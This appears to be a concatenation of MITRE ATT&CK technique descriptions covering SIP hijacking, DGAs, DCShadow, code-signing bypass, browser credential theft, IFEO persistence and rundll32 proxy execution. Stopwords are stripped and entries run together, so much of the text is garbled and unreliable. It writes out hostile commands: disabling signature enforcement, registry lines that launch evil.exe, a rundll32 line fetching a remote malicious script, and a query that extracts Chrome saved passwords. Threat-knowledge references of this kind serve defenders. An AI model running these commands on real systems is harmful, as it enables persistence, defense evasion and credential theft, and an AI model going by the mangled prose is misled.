Because varying executable file types signature formats, created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) provide layer abstraction API functions files. SIPs responsible enabling API functions create, retrieve, calculate, verify signatures. Unique SIPs exist file formats (Executable, PowerShell, Installer, etc., catalog signing providing catch-all  (Citation: Catalog Files Signatures April 2017)) identified globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)

Similar [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries abuse architecture subvert trust controls bypass security policies legitimately signed code execute system. Adversaries hijack SIP trust provider components mislead operating application control tools classify malicious (or any) code signed by: (Citation: SpectorOps Subverting Trust Sept 2017)

* Modifying <code>Dll</code> <code>FuncName</code> Registry values <code>HKLM\SOFTWARE[\WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID}</code> dynamic link library (DLL) providing SIP’s CryptSIPDllGetSignedDataMsg function, retrieves encoded digital certificate signed file. maliciously-crafted DLL exported function returns signature (ex: signature Portable Executables) file’s real signature, adversary apply acceptable signature files SIP (Citation: GitHub SIP POC Sept 2017) (although hash mismatch occur, invalidating signature, hash returned function match computed file).
* Modifying <code>Dll</code> <code>FuncName</code> Registry values <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID}</code> DLL providing SIP’s CryptSIPDllVerifyIndirectData function, validates file’s computed hash signed hash value. maliciously-crafted DLL exported function returns TRUE (indicating validation successful), adversary validate file (with legitimate signature) SIP (Citation: GitHub SIP POC Sept 2017) (with hijacking mentioned CryptSIPDllGetSignedDataMsg function). Registry redirected suitable exported function DLL, avoiding requirement drop execute file disk.
* Modifying <code>DLL</code> <code>Function</code> Registry values <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID}</code> DLL providing trust provider’s FinalPolicy function, decoded parsed signature checked majority trust decisions made. hijacking SIP’s CryptSIPDllVerifyIndirectData function, redirected suitable exported function DLL maliciously-crafted DLL (though implementation trust provider complex).
* **Note:** hijacks modifying Registry [DLL Search Hijacking](https://attack.mitre.org/techniques/T1574/001).

Hijacking SIP trust provider components enable persistent code execution, malicious components invoked application performs code signing signature validation. (Citation: SpectorOps Subverting Trust Sept 2017) Adversaries Domain Generation Algorithms (DGAs) dynamically identify destination command control traffic relying list static IP addresses domains. advantage harder defenders block, track, command control channel, thousands domains malware check instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)

DGAs form random “gibberish” strings (ex: istgmxdejdnxuyla.ru) construct domain names generating letter. Alternatively, DGAs employ unit concatenating letters (ex: cityjulydish.net). DGAs time-based, generating domain time period (hourly, daily, monthly, etc). incorporate seed predicting future domains difficult defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)

Adversaries DGAs purpose [Fallback Channels](https://attack.mitre.org/techniques/T1008). contact lost primary command control server malware employ DGA reestablishing command control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity) Adversaries advantage security vulnerabilities inherent functionality browser software change content, modify user-behaviors, intercept browser session hijacking techniques.(Citation: Wikipedia Browser)

A specific adversary injects software browser inherit cookies, sessions, SSL client certificates user browser pivot authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors pivoting require specific process permissions, <code>SeDebugPrivilege</code> high-integrity/administrator rights.

Another involves pivoting browser traffic adversary's browser user's browser setting proxy redirect traffic. alter user's traffic way, proxy connection severed browser closed. adversary assumes security context browser process proxy injected into. Browsers typically create process tab permissions certificates separated accordingly. permissions, adversary browse resource intranet, [Sharepoint](https://attack.mitre.org/techniques/T1213/002) webmail, accessible browser browser sufficient permissions. Browser pivoting bypass security 2-factor authentication.(Citation: cobaltstrike manual) Adversaries [Valid Accounts](https://attack.mitre.org/techniques/T1078) log service designed accept remote connections, telnet, SSH, VNC. adversary perform actions logged-on user.

In enterprise environment, servers workstations organized domains. Domains provide centralized identity management, allowing users login set credentials entire network. adversary set valid domain credentials, login machines remote access protocols secure (SSH) remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services)

Legitimate applications (such [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) administrative programs) utilize [Remote Services](https://attack.mitre.org/techniques/T1021) access remote hosts. example, Apple Remote Desktop (ARD) macOS native software remote management. ARD leverages blend protocols, including [VNC](https://attack.mitre.org/techniques/T1021/005) send screen control buffers [SSH](https://attack.mitre.org/techniques/T1021/004) secure file transfer.(Citation: Remote Management MDM macOS)(Citation: Kickstart Apple Remote Desktop commands)(Citation: Apple Remote Desktop Admin Guide 3.3) Adversaries abuse applications ARD gain remote code execution perform lateral movement. versions macOS prior 10.14, adversary escalate SSH session ARD session enables adversary accept TCC (Transparency, Consent, Control) prompts user interaction gain access data.(Citation: FireEye 2019 Apple Remote Desktop)(Citation: Lockboxx ARD 2019)(Citation: Kickstart Apple Remote Desktop commands) Adversaries communicate application layer protocols electronic mail delivery avoid detection/network filtering blending existing traffic. Commands remote system, commands, embedded protocol traffic client server. 

Protocols SMTP/S, POP3/S, IMAP carry electronic mail common environments.  Packets produced protocols fields headers data concealed. Data concealed email messages themselves. adversary abuse protocols communicate systems control victim network mimicking normal, expected traffic.  Adversaries patch, modify, backdoor cloud authentication processes tied on-premises user identities bypass typical authentication mechanisms, access credentials, enable persistent access accounts.  

Many organizations maintain hybrid user device identities shared on-premises cloud-based environments. maintained ways. example, Azure includes options synchronizing identities Active Directory Azure AD(Citation: Azure Hybrid Identity):

* Password Hash Synchronization (PHS), privileged on-premises account synchronizes user password hashes Active Directory Azure AD, allowing authentication Azure cloud 
* Pass Authentication (PTA), Azure authentication attempts forwarded on-premises PTA agent, validates credentials Active Directory 
* Active Directory Federation Services (AD FS), trust relationship established Active Directory Azure 

AD FS SaaS cloud platforms AWS GCP, hand authentication process FS receive token hybrid users’ identity privileges. 

By modifying authentication processes tied hybrid identities, adversary establish persistent privileged access cloud resources. example, adversaries compromise on-premises server running PTA agent inject malicious DLL `AzureADConnectAuthenticationAgentService` process authorizes attempts authenticate Azure AD, records user credentials.(Citation: Azure Connect Read Teamers)(Citation: AADInternals Azure On-Prem Cloud) environments FS, adversary edit `Microsoft.IdentityServer.Servicehost` configuration file load malicious DLL generates authentication tokens user set claims, bypassing multi-factor authentication defined FS policies.(Citation: MagicWeb)

In cases, adversaries modify hybrid identity authentication process cloud. example, adversaries compromise Global Administrator account Azure tenant register PTA agent console, allowing harvest credentials log Azure environment user.(Citation: Mandiant Azure Backdoors) Adversaries scan victims vulnerabilities targeting. Vulnerability scans typically check configuration target host/application (ex: software version) aligns target specific exploit adversary seek use.

These scans include broad attempts [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592) identify commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software version server banners, listening ports, network artifacts.(Citation: OWASP Vuln Scanning) scans reveal opportunities forms reconnaissance (ex: [Search Websites/Domains](https://attack.mitre.org/techniques/T1593) [Search Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)). Adversaries search freely technical databases victims targeting. victims online databases repositories, registrations domains/certificates public collections network data/artifacts gathered traffic scans.(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS)(Citation: Medium SSL Cert)(Citation: SSLShopper Lookup)(Citation: DigitalShadows CDN)(Citation: Shodan)

Adversaries search databases depending seek gather. sources reveal opportunities forms reconnaissance (ex: [Phishing Information](https://attack.mitre.org/techniques/T1598) [Search Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) [Trusted Relationship](https://attack.mitre.org/techniques/T1199)). Adversaries register rogue Domain Controller enable manipulation Active Directory data. DCShadow create rogue Domain Controller (DC). DCShadow method manipulating Active Directory (AD) data, including objects schemas, registering (or reusing inactive registration) simulating behavior DC. (Citation: DCShadow Blog) registered, rogue DC inject replicate infrastructure domain object, including credentials keys.

Registering rogue DC involves creating server nTDSDSA objects Configuration partition schema, requires Administrator privileges (either Domain local DC) KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)

This technique bypass logging security monitors security event management (SIEM) products (since actions rogue DC reported sensors). (Citation: DCShadow Blog) technique alter delete replication metadata obstruct forensic analysis. Adversaries utilize technique perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) manipulate objects (such accounts, access control lists, schemas) establish backdoors Persistence. (Citation: DCShadow Blog) Adversaries modify code signing policies enable execution unsigned self-signed code. Code signing level authenticity program developer guarantee program tampered with. Security controls include enforcement mechanisms ensure valid, signed code operating system. 

Some security controls enabled default, Driver Signature Enforcement (DSE) Windows Integrity Protection (SIP) macOS.(Citation: DSE June 2017)(Citation: Apple Disable SIP) controls disabled default configurable application controls, allowing signed Dynamic-Link Libraries (DLLs) execute system. developers modify default signature enforcement policies development testing applications, disabling features elevated permissions.(Citation: Unsigned Driver Apr 2017)(Citation: Apple Disable SIP)

Adversaries modify code signing policies ways, including command-line GUI utilities, [Modify Registry](https://attack.mitre.org/techniques/T1112), rebooting debug/recovery mode, altering variables kernel memory.(Citation: TESTSIGNING Feb 2021)(Citation: Apple Disable SIP)(Citation: FireEye HIKIT Rootkit 2)(Citation: GitHub Turla Driver Loader) Examples commands modify code signing policy include <code>bcdedit.exe -set TESTSIGNING ON</code> Windows <code>csrutil disable</code> macOS.(Citation: TESTSIGNING Feb 2021)(Citation: Apple Disable SIP) Depending implementation, successful modification signing policy require reboot compromised system. Additionally, implementations introduce visible artifacts user (ex: watermark corner screen stating Mode). Adversaries attempt remove artifacts.(Citation: F-Secure BlackEnergy 2014)

To gain access kernel memory modify variables signature checks, modifying <code>g_CiOptions</code> disable Driver Signature Enforcement, adversaries conduct [Exploitation Privilege Escalation](https://attack.mitre.org/techniques/T1068) signed, vulnerable driver.(Citation: Unit42 AcidBox June 2020)(Citation: GitHub Turla Driver Loader) Adversaries deploy container environment facilitate execution evade defenses. cases, adversaries deploy container execute processes image deployment, processes execute download malware. others, adversary deploy container configured network rules, user limitations, etc. bypass existing defenses environment.

Containers deployed means, Docker's <code>create</code> <code>start</code> APIs application Kubernetes dashboard Kubeflow.(Citation: Docker Containers API)(Citation: Kubernetes Dashboard)(Citation: Kubeflow Pipelines) Adversaries deploy containers based retrieved built malicious images benign images download execute malicious payloads runtime.(Citation: Aqua Build Images Hosts) Adversaries delete files left actions intrusion activity. Malware, tools, non-native files dropped created adversary leave traces network how. Removal files occur intrusion, post-intrusion process minimize adversary's footprint.

There tools host operating perform cleanup, adversaries tools well. Examples include native [cmd](https://attack.mitre.org/software/S0106) functions DEL, secure deletion tools Windows Sysinternals SDelete, third-party file deletion tools. (Citation: Trend Micro APT Attack Tools) Private cryptographic certificates authentication, encryption/decryption, digital signatures. (Citation: Wikipedia Public Key Crypto)

Adversaries gather private compromised systems authenticating [Remote Services](https://attack.mitre.org/techniques/T1021) SSH decrypting collected files email. Common key certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. Adversaries common key directories, <code>~/.ssh</code> SSH * nix-based systems <code>C:\Users\(username)\.ssh\</code> Windows.

Private require password passphrase operation, adversary [Input Capture](https://attack.mitre.org/techniques/T1056) keylogging attempt [Brute Force](https://attack.mitre.org/techniques/T1110) passphrase off-line.

Adversary tools discovered search compromised systems file extensions relating cryptographic certificates. (Citation: Kaspersky Careto) (Citation: Palo Alto Prince Persia) Adversaries interact Windows Registry hide configuration Registry keys, remove cleaning up, techniques aid persistence execution.

Access specific Registry depends account permissions, requiring administrator-level access. built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) local remote Registry modification. (Citation: Reg) tools used, remote access tool, functionality interact Registry Windows API.

Registry modifications include actions hide keys, prepending key names character, error read [Reg](https://attack.mitre.org/software/S0075) utilities Win32 API. (Citation: Reghide NOV 2006) Adversaries abuse pseudo-hidden conceal payloads/commands maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)

The Registry remote modified aid execution files lateral movement. requires remote Registry service running target system. (Citation: Remote) [Valid Accounts](https://attack.mitre.org/techniques/T1078) required, access remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) RPC communication. Adversaries create modify Launch Daemons execute malicious payloads persistence. Launch Daemons plist files interact Launchd, service management framework macOS. Launch Daemons require elevated privileges install, executed user prior login, background user interaction. macOS initialization startup, launchd process loads parameters launch-on-demand system-level daemons plist files <code>/System/Library/LaunchDaemons/</code> <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include <code>Label</code> identify task, <code>Program</code> provide path executable, <code>RunAtLoad</code> task run. Launch Daemons provide access shared resources, updates software, conduct automation tasks.(Citation: AppleDocs Launch Agent Daemons)(Citation: Methods Mac Malware Persistence)(Citation: launchd Keywords plists)

Adversaries install Launch Daemon configured execute startup <code>RunAtLoad</code> parameter set <code>true</code> <code>Program</code> parameter set malicious executable path. daemon disguised operating benign software [Masquerading](https://attack.mitre.org/techniques/T1036)). Launch Daemon executed, program inherits administrative permissions.(Citation: WireLurker)(Citation: OSX Malware Detection)

Additionally, configuration (such installation party package managing software) folders <code>usr/local/bin</code> globally writeable. So, poor configurations adversary modify executables referenced current Launch Daemon's plist files.(Citation: LaunchDaemon Hijacking)(Citation: sentinelone macos persist Jun 2019) adversary attempt discover infrastructure resources infrastructure-as-a-service (IaaS) environment. includes compute service resources instances, virtual machines, snapshots resources services including storage database services.

Cloud providers offer methods APIs commands issued CLIs serve infrastructure. example, AWS <code>DescribeInstances</code> API Amazon EC2 API return instances account, <code>ListBuckets</code> API returns list buckets owned authenticated sender request, <code>HeadBucket</code> API determine bucket’s existence access permissions request sender, <code>GetPublicAccessBlock</code> API retrieve access block configuration bucket.(Citation: Amazon Instance)(Citation: Amazon Instances API)(Citation: AWS Public Access Block)(Citation: AWS Head Bucket) Similarly, GCP's Cloud SDK CLI <code>gcloud compute instances list</code> command list Google Compute Engine instances project (Citation: Google Compute Instances), Azure's CLI command <code>az vm list</code> lists details virtual machines.(Citation: CLI) addition API commands, adversaries utilize source tools discover cloud storage infrastructure [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003).(Citation: Malwarebytes OSINT Leaky Buckets - Hioureas)

An adversary enumerate resources compromised user's access determine user.(Citation: Expel Evil AWS) discovery resources adversaries determine steps Cloud environment, establishing Persistence.(Citation: Mandiant M-Trends 2020)An adversary change configuration bucket publicly accessible, allowing data accessed authentication. Adversaries infrastructure discovery APIs <code>DescribeDBInstances</code> determine size, owner, permissions, network ACLs database resources. (Citation: AWS DB Instances) Adversaries determine potential databases discover requirements access them. [Cloud Service Discovery](https://attack.mitre.org/techniques/T1526), technique focuses discovery components services services themselves. Adversaries acquire credentials browsers reading files specific target browser.(Citation: Talos Olympic Destroyer 2018) browsers commonly save credentials usernames passwords entered manually future. browsers typically store credentials encrypted format credential store; however, methods exist extract plaintext credentials browsers.

For example, Windows systems, encrypted credentials Google Chrome reading database file, <code>AppData\Local\Google\Chrome\User Data\Default\Login Data</code> executing SQL query: <code>SELECT action_url, username_value, password_value logins;</code>. plaintext password passing encrypted credentials Windows API function <code>CryptUnprotectData</code>, victim’s cached logon credentials decryption key.(Citation: CryptUnprotectData April 2018)
 
Adversaries executed procedures common browsers FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet Explorer Edge credentials Credential Lockers managed [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).

Adversaries acquire credentials searching browser process memory patterns commonly match credentials.(Citation: GitHub Mimikittenz July 2016)

After acquiring credentials browsers, adversaries attempt recycle credentials systems accounts expand access. result adversary's objective credentials gained browsers overlap privileged accounts (e.g. domain administrator). Adversaries execute malicious payloads hijacking search load programs. programs programs path, adversaries file directory calling program located, causing operating launch malicious software request calling program.

Search hijacking occurs adversary abuses Windows searches programs path. [DLL Search Hijacking](https://attack.mitre.org/techniques/T1574/001), search differs depending method execute program. (Citation: CreateProcess) (Citation: Windows NT Command Shell) (Citation: WinExec) However, common Windows search directory initiating program searching Windows directory. adversary program vulnerable search hijacking (i.e., program path executable) advantage vulnerability creating program named improperly program placing initiating program's directory.

For example, "example.exe" runs "cmd.exe" command-line argument <code>net user</code>. adversary program called "net.exe" directory example.exe, "net.exe" Windows utility net. addition, adversary program called "net.com" directory "net.exe", <code>cmd.exe /C user</code> execute "net.com" "net.exe" executable extensions defined PATHEXT. (Citation: Environment Property)

Search hijacking common practice hijacking DLL loads covered [DLL Search Hijacking](https://attack.mitre.org/techniques/T1574/001). Adversaries modify visual content internally externally enterprise network, integrity original content. Reasons [Defacement](https://attack.mitre.org/techniques/T1491) include delivering messaging, intimidation, claiming (possibly false) credit intrusion. Disturbing offensive images [Defacement](https://attack.mitre.org/techniques/T1491) user discomfort, pressure compliance accompanying messages. 
 Adversaries create cloud instances unused geographic service regions evade detection. Access compromising accounts manage cloud infrastructure.

Cloud service providers provide infrastructure improve performance, provide redundancy, customers meet compliance requirements. Oftentimes, customer subset regions actively monitor regions. adversary creates resources unused region, operate undetected.

A variation behavior takes advantage differences functionality cloud regions. adversary utilize regions support advanced detection services avoid detection activity.

An adversary unused AWS regions cryptocurrency [Resource Hijacking](https://attack.mitre.org/techniques/T1496), cost organizations substantial amounts money time depending processing power used.(Citation: CloudSploit - Unused AWS Regions) Adversaries redirect network traffic adversary-owned systems spoofing Dynamic Host Configuration Protocol (DHCP) traffic acting malicious DHCP server victim network. achieving adversary-in-the-middle (AiTM) position, adversaries collect network communications, including passed credentials, insecure, unencrypted protocols. enable follow-on behaviors [Network Sniffing](https://attack.mitre.org/techniques/T1040) [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).

DHCP based client-server model functionalities: protocol providing network configuration settings DHCP server client mechanism allocating network addresses clients.(Citation: rfc2131) typical server-client interaction follows: 

1. client broadcasts `DISCOVER` message.

2. server responds `OFFER` message, includes network address. 

3. client broadcasts `REQUEST` message, includes network address offered. 

4. server acknowledges `ACK` message client receives network configuration parameters.

Adversaries spoof rogue DHCP server victim network, legitimate hosts receive malicious network configurations. example, malware DHCP server provide adversary-owned DNS servers victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) malicious network configurations, adversary achieve AiTM position, route client traffic adversary-controlled systems, collect client network.

DHCPv6 clients receive network configuration assigned IP address sending <code>INFORMATION-REQUEST (code 11)</code> message <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries rogue DHCP server respond request message malicious network configurations.

Rather establishing AiTM position, adversaries abuse DHCP spoofing perform DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) generating broadcast DISCOVER messages exhaust network’s DHCP allocation pool.  macOS OS applications send AppleEvent messages interprocess communications (IPC). messages easily scripted AppleScript local remote IPC. Osascript executes AppleScript Scripting Architecture (OSA) language scripts. list OSA languages installed <code>osalang</code> program.
AppleEvent messages independently script. events locate windows, send keystrokes, interact application locally remotely. 

Adversaries interact SSH connection, remote machines, users fake dialog boxes. events start applications remotely (they start locally though), interact applications running remotely. scripting language, launch common techniques reverse python  (Citation: Macro Malware Targets Macs). Scripts command-line <code>osascript /path/to/script</code> <code>osascript -e "script here"</code>. Adversaries control preexisting sessions remote services laterally environment. Users valid credentials log service designed accept remote connections, telnet, SSH, RDP. user logs service, session established maintain continuous interaction service.

Adversaries commandeer sessions carry actions remote systems. [Remote Service Session Hijacking](https://attack.mitre.org/techniques/T1563) differs [Remote Services](https://attack.mitre.org/techniques/T1021) hijacks existing session creating session [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: RDP Hijacking Medium)(Citation: Breach Post-mortem SSH Hijack) Adversaries binary padding add junk data change on-disk representation malware. functionality behavior binary, increase size binary security tools capable handling file size limitations. 

Binary padding effectively checksum file avoid hash-based blocklists static anti-virus signatures.(Citation: ESET OceanLotus) padding commonly generated function create junk data appended applied sections malware.(Citation: Securelist Malware Tricks April 2017) Increasing file size decrease effectiveness tools detection capabilities designed configured scan files. reduce likelihood collected analysis. Public file scanning services, VirusTotal, limits maximum size uploaded file analyzed.(Citation: VirusTotal FAQ)  Adversaries backdoor servers shells establish persistent access systems. script openly accessible server adversary server gateway network. provide set functions execute command-line interface hosts server.(Citation: volexity_0day_sophos_FW)

In addition server-side script, client interface program talk server (e.g. [China Chopper](https://attack.mitre.org/software/S0020) client).(Citation: Lee 2013) Adversaries modify Policy Objects (GPOs) subvert intended discretionary access controls domain, intention escalating privileges domain. policy centralized management user settings Active Directory (AD). GPOs containers policy settings files stored predicable network path <code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</code>.(Citation: TechNet Policy Basics)(Citation: ADSecurity GPO Persistence 2016) 

Like objects AD, GPOs access controls them. default user accounts domain permission read GPOs. delegate GPO access control permissions, e.g. write access, specific users domain.

Malicious GPO modifications implement malicious behaviors [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Disable Modify Tools](https://attack.mitre.org/techniques/T1562/001), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002),  more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant Trends 2016)(Citation: Hacking Team Breach) GPOs control user machine settings environment, potential attacks stem GPO abuse.(Citation: Wald0 Guide GPOs)

For example, publicly scripts <code>New-GPOImmediateTask</code> leveraged automate creation malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) modifying GPO settings, modifying <code>&lt;GPO_PATH&gt;\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml</code>.(Citation: Wald0 Guide GPOs)(Citation: Harmj0y Abusing GPO Permissions) adversary modify specific user rights SeEnableDelegationPrivilege, set <code>&lt;GPO_PATH&gt;\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</code>, achieve subtle backdoor complete control domain user account adversary's control modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right) Adversaries enumerate browser bookmarks learn compromised hosts. Browser bookmarks reveal personal users (ex: banking sites, interests, social media, etc.) details internal network resources servers, tools/dashboards, infrastructure.

Browser bookmarks highlight additional targets adversary access valid credentials, [Credentials Files](https://attack.mitre.org/techniques/T1552/001) logins cached browser.

Specific storage locations vary based platform application, browser bookmarks typically stored local files/databases. Adversaries search private key certificate files compromised systems insecurely stored credentials. Private cryptographic certificates authentication, encryption/decryption, digital signatures.(Citation: Wikipedia Public Key Crypto) Common key certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. 

Adversaries common key directories, <code>~/.ssh</code> SSH * nix-based systems <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> Windows. private authenticate [Remote Services](https://attack.mitre.org/techniques/T1021) SSH decrypting collected files email.

Adversary tools discovered search compromised systems file extensions relating cryptographic certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince Persia)

Some private require password passphrase operation, adversary [Input Capture](https://attack.mitre.org/techniques/T1056) keylogging attempt [Brute Force](https://attack.mitre.org/techniques/T1110) passphrase off-line. Adversaries buy, lease, rent physical servers that targeting. servers adversary stage, launch, execute operation. post-compromise activity, adversaries utilize servers tasks, including Command Control. compromising third-party [Server](https://attack.mitre.org/techniques/T1584/004) renting [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries opt configure servers support operations.

Adversaries lightweight setup activities online infrastructure. Or, build extensive infrastructure test, communicate, control aspects activities systems.(Citation: NYTStuxnet) Adversaries [Valid Accounts](https://attack.mitre.org/techniques/T1078) interact remote systems Windows Remote Management (WinRM). adversary perform actions logged-on user.

WinRM Windows service protocol user interact remote executable, modify Registry, modify services).(Citation: WinRM) called `winrm` command programs PowerShell.(Citation: Jacobsen 2014) WinRM  method remotely interacting [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).(Citation: MSDN WMI) Adversaries attempt exfiltrate data Bluetooth command control channel. command control network wired Internet connection, adversary opt exfiltrate data Bluetooth communication channel.

Adversaries choose sufficient access proximity. Bluetooth connections secured defended primary Internet-connected channel routed enterprise network. Adversaries abuse credentials default account gaining Initial Access, Persistence, Privilege Escalation, Defense Evasion. Default accounts built-into OS, Guest Administrator accounts Windows systems. Default accounts include default factory/provider set accounts types systems, software, devices, including root user account AWS default service account Kubernetes.(Citation: Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix Kubernetes)

Default accounts limited client machines, include accounts preset equipment network devices applications internal, source, commercial. Appliances preset username password combination pose threat organizations change post installation, easy targets adversary. Similarly, adversaries utilize publicly disclosed stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) credential materials legitimately connect remote environments [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module) Adversaries abuse time providers execute DLLs boots. Windows Time service (W32Time) enables time synchronization domains.(Citation: W32Time Feb 2018) W32Time time providers responsible retrieving time stamps hardware/network resources outputting values network clients.(Citation: TimeProvider)

Time providers implemented dynamic-link libraries (DLLs) registered subkeys  <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\</code>.(Citation: TimeProvider) time provider manager, directed service control manager, loads starts time providers listed enabled key startup parameters changed.(Citation: TimeProvider)

Adversaries abuse architecture establish persistence, registering enabling malicious DLL time provider. Administrator privileges required time provider registration, execution context Local Service account.(Citation: Github W32Time Oct 2017) Image File Execution Options (IFEO) enable developer attach debugger application. process created, debugger application’s IFEO prepended application’s name, effectively launching process debugger “C:\dbg\ntsd.exe -g  notepad.exe”). (Citation: Dev Blog IFEO Mar 2010)

IFEOs set Registry Global Flags GFlags tool. (Citation: GFlags Mar 2017) IFEOs represented <code>Debugger</code> values Registry <code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable></code> <code><executable></code> binary debugger attached. (Citation: Dev Blog IFEO Mar 2010)

IFEOs enable arbitrary monitor program launched program silently exits prematurely terminated second, kernel-mode process). (Citation: Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) debuggers, silent exit monitoring enabled GFlags modifying IEFO silent process exit Registry values <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>. (Citation: Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)

An evil.exe process started notepad.exe exits: (Citation: Oddvar Moe IFEO APR 2018)

* <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512</code>
* <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1</code>
* <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"</code>

Similar [Process Injection](https://attack.mitre.org/techniques/T1055), values abused persistence privilege escalation causing malicious executable loaded context separate processes computer. (Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms provide Persistence continuous invocation.

Malware IFEO Defense Evasion registering invalid debuggers redirect effectively disable security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008) rundll32.exe program called execute arbitrary binary. Adversaries advantage functionality proxy execution code avoid triggering security tools monitor execution rundll32.exe process whitelists false positives Windows rundll32.exe normal operations.

Rundll32.exe execute Control Panel Item files (.cpl) undocumented shell32.dll functions <code>Control_RunDLL</code> <code>Control_RunDLLAsUser</code>. Double-clicking .cpl file rundll32.exe execute. (Citation: Trend Micro CPL)

Rundll32 execute scripts JavaScript. syntax this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  behavior malware Poweliks. (Citation: Security Command Confusion) Windows service configuration information, including file path service's executable recovery programs/commands, stored Registry. Service configurations modified utilities sc.exe [Reg](https://attack.mitre.org/software/S0075).

Adversaries modify existing service persist malware utilities custom tools interact Windows API. existing services type [Masquerading](https://attack.mitre.org/techniques/T1036) detection analysis challenging. Modifying existing services interrupt functionality enable services disabled commonly used.

Adversaries intentionally corrupt kill services execute malicious recovery programs/commands. (Citation: Twitter Service Recovery Nov 2017) (Citation: Service Recovery Feb 2013) Adversaries establish persistence executing malicious content triggered interrupt signal. <code>trap</code> command programs shells commands executed receiving interrupt signals. common situation script allowing graceful termination handling common keyboard interrupts <code>ctrl+c</code> <code>ctrl+d</code>.

